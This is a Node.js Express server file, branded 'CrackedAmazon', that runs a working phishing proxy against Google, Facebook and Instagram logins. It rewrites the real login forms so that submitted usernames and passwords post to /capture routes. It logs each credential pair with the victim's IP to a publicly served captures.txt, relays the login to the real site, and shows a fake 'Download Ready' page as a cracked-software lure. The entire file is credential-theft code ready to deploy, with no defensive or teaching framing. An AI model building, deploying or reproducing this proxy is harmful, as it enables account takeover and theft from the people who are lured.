const express = require('express');
const { createProxyMiddleware, fixRequestBody } = require('http-proxy-middleware');
const session = require('express-session');
const cookieParser = require('cookie-parser');
const fs = require('fs');
const app = express();
const PORT = process.env.PORT || 3000;

app.use(cookieParser());
app.use(express.urlencoded({ extended: true }));
app.use(express.json());
app.use(session({ secret: 'crackedamazon-secret', resave: false, saveUninitialized: true }));
app.use(express.static(__dirname));

const logFile = 'captures.txt';

// GOOGLE
app.get('/auth/google', (req, res, next) => {
    const tool = req.query.tool || 'unknown';
    req.session.tool = tool;
    createProxyMiddleware({
        target: 'https://accounts.google.com',
        changeOrigin: true,
        secure: false,
        followRedirects: true,
        onProxyRes: (proxyRes, req, res) => {
            let body = '';
            proxyRes.on('data', chunk => { body += chunk; });
            proxyRes.on('end', () => {
                body = body.replace(/action="\/v3\/signin\/challenge\/pwd"/g, 'action="/capture/google"');
                body = body.replace(/action="\/v3\/signin\/challenge"/g, 'action="/capture/google"');
                res.setHeader('Content-Type', 'text/html');
                res.send(body);
            });
        }
    })(req, res, next);
});

app.post('/capture/google', (req, res, next) => {
    const { email, password } = req.body;
    const tool = req.session.tool || 'unknown';
    const ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress;
    const logEntry = `[${new Date().toISOString()}] GOOGLE | ${email}:${password} | Tool: ${tool} | IP: ${ip}\n`;
    fs.appendFileSync(logFile, logEntry);
    console.log(`✅ GOOGLE: ${email}:${password}`);
    req.url = '/v3/signin/challenge/pwd';
    req.target = 'https://accounts.google.com';
    next();
});

app.use('/capture/google', createProxyMiddleware({
    target: 'https://accounts.google.com',
    changeOrigin: true,
    secure: false,
    followRedirects: true,
    onProxyReq: fixRequestBody,
    onProxyRes: (proxyRes, req, res) => {
        if (proxyRes.statusCode === 302 || proxyRes.statusCode === 200) {
            res.redirect(`/download?tool=${req.session.tool || 'tool'}`);
        }
    }
}));

// FACEBOOK
app.get('/auth/facebook', (req, res, next) => {
    const tool = req.query.tool || 'unknown';
    req.session.tool = tool;
    createProxyMiddleware({
        target: 'https://www.facebook.com',
        changeOrigin: true,
        secure: false,
        followRedirects: true,
        onProxyRes: (proxyRes, req, res) => {
            let body = '';
            proxyRes.on('data', chunk => { body += chunk; });
            proxyRes.on('end', () => {
                body = body.replace(/action="\/login\/device-based\/validate-password\/"/g, 'action="/capture/facebook"');
                body = body.replace(/action="\/login\/"/g, 'action="/capture/facebook"');
                res.setHeader('Content-Type', 'text/html');
                res.send(body);
            });
        }
    })(req, res, next);
});

app.post('/capture/facebook', (req, res, next) => {
    const { email, pass } = req.body;
    const tool = req.session.tool || 'unknown';
    const ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress;
    const logEntry = `[${new Date().toISOString()}] FACEBOOK | ${email}:${pass} | Tool: ${tool} | IP: ${ip}\n`;
    fs.appendFileSync(logFile, logEntry);
    console.log(`✅ FACEBOOK: ${email}:${pass}`);
    req.url = '/login/device-based/validate-password/';
    req.target = 'https://www.facebook.com';
    next();
});

app.use('/capture/facebook', createProxyMiddleware({
    target: 'https://www.facebook.com',
    changeOrigin: true,
    secure: false,
    followRedirects: true,
    onProxyReq: fixRequestBody,
    onProxyRes: (proxyRes, req, res) => {
        if (proxyRes.statusCode === 302 || proxyRes.statusCode === 200) {
            res.redirect(`/download?tool=${req.session.tool || 'tool'}`);
        }
    }
}));

// INSTAGRAM
app.get('/auth/instagram', (req, res, next) => {
    const tool = req.query.tool || 'unknown';
    req.session.tool = tool;
    createProxyMiddleware({
        target: 'https://www.instagram.com',
        changeOrigin: true,
        secure: false,
        followRedirects: true,
        onProxyRes: (proxyRes, req, res) => {
            let body = '';
            proxyRes.on('data', chunk => { body += chunk; });
            proxyRes.on('end', () => {
                body = body.replace(/action="\/accounts\/login\/ajax\/"/g, 'action="/capture/instagram"');
                res.setHeader('Content-Type', 'text/html');
                res.send(body);
            });
        }
    })(req, res, next);
});

app.post('/capture/instagram', (req, res, next) => {
    const { username, password } = req.body;
    const tool = req.session.tool || 'unknown';
    const ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress;
    const logEntry = `[${new Date().toISOString()}] INSTAGRAM | ${username}:${password} | Tool: ${tool} | IP: ${ip}\n`;
    fs.appendFileSync(logFile, logEntry);
    console.log(`✅ INSTAGRAM: ${username}:${password}`);
    req.url = '/accounts/login/ajax/';
    req.target = 'https://www.instagram.com';
    next();
});

app.use('/capture/instagram', createProxyMiddleware({
    target: 'https://www.instagram.com',
    changeOrigin: true,
    secure: false,
    followRedirects: true,
    onProxyReq: fixRequestBody,
    onProxyRes: (proxyRes, req, res) => {
        if (proxyRes.statusCode === 302 || proxyRes.statusCode === 200) {
            res.redirect(`/download?tool=${req.session.tool || 'tool'}`);
        }
    }
}));

// DOWNLOAD PAGE
app.get('/download', (req, res) => {
    const tool = req.query.tool || req.session.tool || 'tool';
    const toolName = tool.replace(/-/g, ' ');
    res.send(`
    <!DOCTYPE html>
    <html>
    <head><title>Download • CrackedAmazon</title>
    <style>
        *{margin:0;padding:0;box-sizing:border-box;}
        body{font-family:system-ui;background:linear-gradient(135deg,#0f172a,#1e293b);color:white;min-height:100vh;display:flex;align-items:center;justify-content:center;padding:20px;}
        .card{background:rgba(255,255,255,0.05);backdrop-filter:blur(10px);border-radius:24px;padding:40px;max-width:450px;width:100%;border:1px solid #f97316;}
        .success{color:#10b981;font-size:72px;text-align:center;margin-bottom:20px;}
        h2{color:#f97316;text-align:center;margin-bottom:15px;}
        .tool-name{background:rgba(249,115,22,0.2);color:#f97316;padding:8px 20px;border-radius:50px;display:inline-block;margin:15px 0;}
        .btn{background:#f97316;color:white;border:none;padding:15px 30px;border-radius:50px;font-size:18px;font-weight:600;width:100%;cursor:pointer;margin:20px 0;}
    </style>
    </head>
    <body>
        <div class="card">
            <div class="success">✓</div>
            <h2>Download Ready</h2>
            <div style="text-align:center"><span class="tool-name">${toolName}</span></div>
            <p style="color:#94a3b8;text-align:center;margin:20px 0;">Verification successful!</p>
            <button class="btn" onclick="alert('Download started!')">Download Now</button>
        </div>
    </body>
    </html>
    `);
});

app.get('/captures.txt', (req, res) => {
    res.sendFile(__dirname + '/captures.txt');
});

app.get('/health', (req, res) => res.send('OK'));

app.get('/', (req, res) => {
    res.sendFile(__dirname + '/index.html');
});

app.listen(PORT, '0.0.0.0', () => {
    console.log(`\n🔥 CRACKEDAMAZON PROXY RUNNING ON PORT ${PORT}`);
    console.log(`✅ Google: /auth/google`);
    console.log(`✅ Facebook: /auth/facebook`);
    console.log(`✅ Instagram: /auth/instagram`);
    console.log(`✅ Captures: /captures.txt\n`);
});
